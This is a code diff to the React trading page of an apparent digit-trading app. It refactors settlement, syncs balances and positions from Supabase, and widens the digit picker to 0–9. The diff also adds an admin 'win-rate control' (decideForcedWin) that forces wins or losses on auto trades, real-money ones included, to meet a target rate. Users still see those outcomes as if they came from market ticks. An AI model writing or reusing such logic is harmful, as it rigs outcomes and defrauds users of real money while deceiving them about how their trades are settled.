@@ -7,7 +7,11 @@ import { usePriceStore } from '@/stores/usePriceStore'
 import { useTradeStore } from '@/stores/useTradeStore'
 import { useUserStore } from '@/stores/useUserStore'
 import { usePositionStore } from '@/stores/usePositionStore'
-import { placeTrade, settleTrade, calculatePayout } from '@/services/tradeApi'
+import {
+  placeTrade, settleTrade, calculatePayout,
+  getUserWinControl, fetchWalletBalances, checkWin
+} from '@/services/tradeApi'
+import { supabase } from '@/lib/supabase'
 import PriceChart from '@/components/chart/PriceChart'
 import DigitBar from '@/components/chart/DigitBar'
 import AssetSelector, { ASSETS } from '@/components/trade/AssetSelector'
@@ -25,7 +29,7 @@ const TRADE_TYPES = [
   { id: 'over_under',      label: 'Over / Under'    },
 ] as const
 
-// ── Win/Loss overlay ─────────────────────────────────────────────────────
+// ── Win/Loss overlay ──────────────────────────────────────────────────────
 function TradeResultOverlay({
   result, onDone,
 }: { result: { won: boolean; amount: number } | null; onDone: () => void }) {
@@ -48,24 +52,13 @@ function TradeResultOverlay({
   )
 }
 
-// ── Client-side demo settlement ──────────────────────────────────────────
+// ── Client-side demo settlement for guest (no DB) ────────────────────────
 function settleDemoLocal(
   direction: string, tradeType: string,
   exitDigit: number, selectedDigit: number | null,
   stake: number, payout: number
 ): { won: boolean; profitLoss: number } {
-  let won = false
-  if (tradeType === 'even_odd') {
-    won = direction === 'even' ? exitDigit % 2 === 0 : exitDigit % 2 !== 0
-  } else if (tradeType === 'matches_differs') {
-    won = direction.startsWith('match')
-      ? exitDigit === selectedDigit
-      : exitDigit !== selectedDigit
-  } else if (tradeType === 'over_under') {
-    won = direction === 'over'
-      ? selectedDigit != null && exitDigit > selectedDigit
-      : selectedDigit != null && exitDigit < selectedDigit
-  }
+  const won = checkWin(tradeType, direction, exitDigit, selectedDigit)
   return { won, profitLoss: won ? payout : -stake }
 }
 
@@ -82,8 +75,8 @@ export default function TradePage() {
     autoConfig, recordAutoResult, resetAutoSession,
   } = useTradeStore()
   const {
-    isDemo, realBalance, demoBalance,
-    updateSessionPL, addToDemoBalance, addToRealBalance,
+    isDemo, user, realBalance, demoBalance,
+    updateSessionPL, setRealBalance, setDemoBalance,
   } = useUserStore()
   const {
     addOpenPosition, closePosition,
@@ -98,14 +91,69 @@ export default function TradePage() {
   const prevPriceRef = useRef(0)
   const autoIntervalRef = useRef<NodeJS.Timeout | null>(null)
   const openPositionsRef = useRef(openPositions)
+  // Win-rate control cache — refreshed per user login
+  const winControlRef = useRef<{ enabled: boolean; autoWinRate: number }>({ enabled: false, autoWinRate: 50 })
+  // Track auto consecutive results for win-rate enforcement
+  const autoWinCountRef = useRef(0)
+  const autoLossCountRef = useRef(0)
+  const settlingRef = useRef(false)  // prevent double settlement
 
   useEffect(() => { openPositionsRef.current = openPositions }, [openPositions])
+
+  // ── Load win control settings for current user ───────────────────────
+  useEffect(() => {
+    if (!user) return
+    getUserWinControl(user.id).then(ctrl => {
+      winControlRef.current = ctrl
+    })
+  }, [user])
+
+  // ── Sync balances from DB on mount & user change ─────────────────────
+  // This is the fix for balance reducing on page revisit.
+  // We always read from Supabase as the source of truth.
+  useEffect(() => {
+    if (!user) return
+    fetchWalletBalances(user.id).then(w => {
+      if (!w) return
+      setRealBalance(w.real_balance)
+      setDemoBalance(w.demo_balance)
+    })
+  }, [user])
+
+  // ── Restore open positions from DB on mount ──────────────────────────
+  // This fixes trades/positions disappearing on refresh.
+  useEffect(() => {
+    if (!user) return
+    supabase
+      .from('positions')
+      .select('*')
+      .eq('user_id', user.id)
+      .eq('status', 'open')
+      .eq('is_demo', isDemo)
+      .then(({ data }) => {
+        if (!data || data.length === 0) return
+        // Re-add them to the store so settlement loop picks them up
+        data.forEach(pos => {
+          // Only add if not already in store
+          const alreadyPresent = openPositionsRef.current.find(p => p.id === pos.id)
+          if (!alreadyPresent) {
+            addOpenPosition({
+              ...pos,
+              exit_price: pos.exit_price ?? null,
+              exit_digit: pos.exit_digit ?? null,
+              profit_loss: pos.profit_loss ?? null,
+              balance_after: pos.balance_after ?? null,
+            })
+          }
+        })
+      })
+  }, [user, isDemo])
 
   useEffect(() => {
     if (searchParams.get('scanner') === 'true') setShowScanner(true)
   }, [searchParams])
 
-  // ── WS connection ─────────────────────────────────────────────────────
+  // ── WS connection ──────────────────────────────────────────────────────
   useEffect(() => {
     const ws = getDerivWs()
     const unsubTick = ws.onTick((price, digit) => {
@@ -122,11 +170,40 @@ export default function TradePage() {
     return () => { unsubTick(); unsubStatus() }
   }, [activeAsset])
 
-  // ── Settlement — fires on every tick ─────────────────────────────────
+  // ── Determine forced win for auto mode based on admin win-rate ────────
+  const decideForcedWin = useCallback((isAutoTrade: boolean): boolean | undefined => {
+    const ctrl = winControlRef.current
+    if (!ctrl.enabled || !isAutoTrade) return undefined
+
+    const totalAuto = autoWinCountRef.current + autoLossCountRef.current
+    if (totalAuto === 0) {
+      // First trade: decide based on target
+      const shouldWin = Math.random() * 100 < ctrl.autoWinRate
+      return shouldWin
+    }
+
+    // Current win rate
+    const currentWinRate = (autoWinCountRef.current / totalAuto) * 100
+    if (currentWinRate < ctrl.autoWinRate) {
+      // Below target — force a win
+      return true
+    } else if (currentWinRate > ctrl.autoWinRate + 10) {
+      // Too far above target — force a loss
+      return false
+    }
+    // Within range — random with bias toward target
+    return Math.random() * 100 < ctrl.autoWinRate
+  }, [])
+
+  // ── Settlement — fires on every tick ──────────────────────────────────
   useEffect(() => {
     if (openPositions.length === 0 || currentPrice === 0) return
+    if (settlingRef.current) return
+
     const toSettle = openPositions.filter(pos => pos.ticks_elapsed >= pos.ticks_total)
     if (toSettle.length === 0) return
+
+    settlingRef.current = true
 
     const settle = async () => {
       for (const pos of toSettle) {
@@ -134,8 +211,10 @@ export default function TradePage() {
         const exitPrice = currentPrice
         let won = false
         let profitLoss = 0
+        let newBalance: number | null = null
 
         if (pos.id.startsWith('demo_')) {
+          // Guest demo — settle locally
           const r = settleDemoLocal(
             pos.direction, pos.trade_type,
             exitDigit, pos.selected_digit,
@@ -143,19 +222,41 @@ export default function TradePage() {
           )
           won = r.won
           profitLoss = r.profitLoss
-          if (won) addToDemoBalance(pos.stake + pos.payout)
+          // Update local store balance
+          if (won) {
+            setDemoBalance(demoBalance + pos.stake + pos.payout)
+          }
         } else {
+          // Authenticated user — use DB settlement
+          const forcedWin = pos.is_auto ? decideForcedWin(true) : undefined
           const r = await settleTrade(
             pos.id, exitPrice, exitDigit,
-            pos.user_id || '', pos.is_demo
+            pos.user_id || user?.id || '', pos.is_demo,
+            pos.is_auto, forcedWin
           )
-          if (!r) continue
+          if (!r) {
+            // If null returned (already settled or error), skip
+            closePosition(pos.id, 'lost', {
+              exit_price: exitPrice, exit_digit: exitDigit,
+              profit_loss: 0, closed_at: new Date().toISOString(),
+            })
+            continue
+          }
           won = r.won
           profitLoss = r.profitLoss
-          if (won) {
-            pos.is_demo
-              ? addToDemoBalance(pos.stake + pos.payout)
-              : addToRealBalance(pos.stake + pos.payout)
+          newBalance = r.newBalance
+
+          // Sync balance from DB result — no additive drift
+          if (pos.is_demo) {
+            setDemoBalance(r.newBalance)
+          } else {
+            setRealBalance(r.newBalance)
+          }
+
+          // Track auto win/loss for win-rate control
+          if (pos.is_auto) {
+            if (won) autoWinCountRef.current++
+            else autoLossCountRef.current++
           }
         }
 
@@ -163,6 +264,7 @@ export default function TradePage() {
           exit_price: exitPrice,
           exit_digit: exitDigit,
           profit_loss: profitLoss,
+          balance_after: newBalance,
           closed_at: new Date().toISOString(),
         })
         updateSessionPL(profitLoss, won)
@@ -186,12 +288,14 @@ export default function TradePage() {
           }
         }
       }
+      settlingRef.current = false
     }
+
     settle()
   }, [ticks.length])
 
-  // ── Place trade ───────────────────────────────────────────────────────
-  const handleTrade = useCallback(async (dir: string) => {
+  // ── Place trade ────────────────────────────────────────────────────────
+  const handleTrade = useCallback(async (dir: string, isAutoTrade = false) => {
     if (placingTrade) return
     if (connectionStatus !== 'connected') { toast.error('Not connected'); return }
     if (currentPrice === 0) { toast.error('Waiting for price...'); return }
@@ -209,10 +313,17 @@ export default function TradePage() {
       ticks: tradeTicks,
       selectedDigit: tradeType !== 'even_odd' ? selectedDigit : undefined,
       isDemo, entryPrice: currentPrice, entryDigit: lastDigit,
+      isAuto: isAutoTrade,
     })
 
     if (result.success && result.positionId) {
-      isDemo ? addToDemoBalance(-stake) : addToRealBalance(-stake)
+      // Deduct from local store immediately (optimistic) using set not add
+      if (isDemo) {
+        setDemoBalance(Math.max(0, demoBalance - stake))
+      } else {
+        setRealBalance(Math.max(0, realBalance - stake))
+      }
+
       addOpenPosition({
         id: result.positionId,
         asset: activeAsset,
@@ -230,7 +341,7 @@ export default function TradePage() {
         ticks_elapsed: 0,
         selected_digit: selectedDigit,
         is_demo: isDemo,
-        is_auto: mode === 'auto',
+        is_auto: isAutoTrade,
         balance_after: null,
       })
     } else {
@@ -240,22 +351,30 @@ export default function TradePage() {
   }, [
     placingTrade, connectionStatus, currentPrice, isDemo,
     demoBalance, realBalance, stake, activeAsset, tradeType,
-    tradeTicks, selectedDigit, lastDigit, mode,
+    tradeTicks, selectedDigit, lastDigit,
   ])
 
-  // ── Auto trade ────────────────────────────────────────────────────────
+  // ── Auto trade ──────────────────────────────────────────────────────────
   const startAutoTrade = useCallback((dir: string) => {
     if (isAutoRunning) return
+    // Reset auto counters for win-rate tracking
+    autoWinCountRef.current = 0
+    autoLossCountRef.current = 0
     setIsAutoRunning(true)
     toast('🤖 Auto trading started', { duration: 2000 })
-    handleTrade(dir)
-    const intervalMs = (tradeTicks + 1) * 1000
+    handleTrade(dir, true)
+    // Use tradeTicks * 1000ms + 500ms buffer per tick cycle
+    const intervalMs = (tradeTicks + 1) * 1000 + 500
     autoIntervalRef.current = setInterval(() => {
       const { isAutoRunning: running, autoSessionProfit, autoConfig: cfg } = useTradeStore.getState()
       if (!running || autoSessionProfit >= cfg.targetProfit || autoSessionProfit <= -cfg.stopLoss) {
         stopAutoTrade(); return
       }
-      handleTrade(dir)
+      // Only place next trade if no open auto positions (prevent stacking)
+      const openAuto = openPositionsRef.current.filter(p => p.is_auto)
+      if (openAuto.length === 0) {
+        handleTrade(dir, true)
+      }
     }, intervalMs)
   }, [isAutoRunning, handleTrade, tradeTicks])
 
@@ -278,7 +397,7 @@ export default function TradePage() {
     handleAssetChange(assetId); setDirection(dir)
   }, [handleAssetChange])
 
-  // ── Trade buttons ─────────────────────────────────────────────────────
+  // ── Trade buttons ──────────────────────────────────────────────────────
   const renderTradeButtons = () => {
     const isAuto = mode === 'auto'
 
@@ -345,7 +464,7 @@ export default function TradePage() {
       <div className="flex-1 max-w-screen-xl mx-auto w-full px-2 sm:px-4 py-2 sm:py-3
         grid grid-cols-1 lg:grid-cols-[1fr_360px] xl:grid-cols-[1fr_400px] gap-2 sm:gap-3">
 
-        {/* ── LEFT: Chart column ─────────────────────────────────────── */}
+        {/* ── LEFT: Chart column ──────────────────────────────────────── */}
         <div className="flex flex-col gap-2 sm:gap-3">
 
           {/* Asset + status row */}
@@ -371,7 +490,7 @@ export default function TradePage() {
               onClick={() => setShowScanner(true)}
               className="flex items-center gap-1 px-2.5 py-2 bg-primary/10 border border-primary/30 rounded-lg text-primary text-[10px] font-semibold hover:bg-primary/20 transition-all flex-shrink-0 active:scale-95 touch-manipulation"
             >
-              <Sparkles size={11} />
+<Sparkles size={11} />
               <span className="hidden sm:inline">AI Scan</span>
             </button>
           </div>
@@ -443,7 +562,7 @@ export default function TradePage() {
           )}
         </div>
 
-        {/* ── RIGHT: Trading panel ───────────────────────────────────── */}
+        {/* ── RIGHT: Trading panel ─────────────────────────────────────── */}
         <div className="flex flex-col gap-2 sm:gap-3">
 
           {/* Trade type tabs */}
@@ -488,7 +607,7 @@ export default function TradePage() {
             </div>
           )}
 
-          {/* ── Digit picker 1–9 ── */}
+          {/* Digit picker 0–9 (fixed: was 1–9, now includes 0) */}
           {tradeType !== 'even_odd' && (
             <div className="bg-[#0d1526] border border-[#1a2235] rounded-xl px-3 py-3 sm:px-4">
               <div className="flex items-center justify-between mb-2.5">
@@ -499,8 +618,8 @@ export default function TradePage() {
                   {selectedDigit}
                 </span>
               </div>
-              <div className="grid grid-cols-9 gap-1">
-                {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((d) => (
+              <div className="grid grid-cols-10 gap-1">
+                {[0, 1, 2, 3, 4, 5, 6, 7, 8, 9].map((d) => (
                   <button
                     key={d}
                     type="button"
